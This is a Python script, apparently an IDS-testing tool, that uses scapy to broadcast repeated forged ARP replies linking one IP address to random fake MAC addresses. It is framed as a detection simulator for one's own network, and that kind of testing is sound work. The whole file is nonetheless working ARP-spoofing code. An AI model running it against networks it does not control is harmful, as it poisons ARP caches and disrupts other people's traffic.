"""
ARP Spoofing Simulator

This script simulates an ARP spoofing attack by sending fake ARP packets
with the same IP address but different MAC addresses.

Usage:
    python tools/simulate_arp_spoof.py

WARNING: Only use this on your own network for testing purposes!
"""

from scapy.all import ARP, send
import time
import random

def simulate_arp_spoof(target_ip='192.168.1.100', num_fake_macs=5, delay=1):
    """
    Simulates ARP spoofing by sending ARP packets with different MAC addresses
    for the same IP address.
    
    Args:
        target_ip: The IP address to spoof
        num_fake_macs: Number of different fake MAC addresses to use
        delay: Delay in seconds between sending packets
    """
    print(f"Starting ARP spoofing simulation for IP: {target_ip}")
    print(f"Will send {num_fake_macs} different MAC addresses")
    print(f"Delay between packets: {delay} seconds\n")
    
    # Generate random MAC addresses
    fake_macs = []
    for i in range(num_fake_macs):
        # Generate a random MAC address
        mac = ':'.join([f'{random.randint(0, 255):02x}' for _ in range(6)])
        fake_macs.append(mac)
        print(f"Fake MAC {i+1}: {mac}")
    
    print("\nSending ARP packets (Ctrl+C to stop)...\n")
    
    try:
        packet_count = 0
        while True:
            for mac in fake_macs:
                # Create an ARP packet (ARP reply)
                # op=2 means ARP reply (op=1 would be ARP request)
                arp_packet = ARP(
                    op=2,           # ARP reply
                    psrc=target_ip, # Pretend to be this IP
                    hwsrc=mac,      # With this MAC address
                    pdst='192.168.1.1',  # Destination IP (e.g., router)
                    hwdst='ff:ff:ff:ff:ff:ff'  # Broadcast
                )
                
                # Send the packet
                send(arp_packet, verbose=False)
                packet_count += 1
                
                print(f"Sent packet {packet_count}: {target_ip} is at {mac}")
                time.sleep(delay)
                
    except KeyboardInterrupt:
        print(f"\n\nStopped. Sent {packet_count} spoofed ARP packets.")

if __name__ == '__main__':
    print("=" * 60)
    print("ARP Spoofing Simulator")
    print("=" * 60)
    print("\nThis will simulate an ARP spoofing attack on your local network.")
    print("Make sure your IDS is running to detect it!\n")
    
    # You can customize these values
    TARGET_IP = '192.168.1.100'  # The IP being spoofed
    NUM_FAKE_MACS = 5            # Number of different MAC addresses
    DELAY = 2                    # Seconds between packets
    
    simulate_arp_spoof(TARGET_IP, NUM_FAKE_MACS, DELAY)
